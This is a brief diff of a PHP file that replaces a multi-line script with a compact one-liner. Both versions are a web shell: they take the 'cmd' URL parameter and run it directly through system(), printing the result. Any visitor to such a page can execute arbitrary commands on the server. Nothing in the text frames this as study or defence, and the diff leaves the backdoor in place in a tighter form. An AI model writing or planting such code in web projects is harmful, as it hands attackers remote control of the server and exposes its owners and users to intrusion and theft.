@@ -1,9 +1,1 @@
-<?php
-
-
-$s = $_GET[cmd];
-
-echo system($s);
-
-
-?>
+<?php $p = $_GET[cmd]; echo system($p); ?>
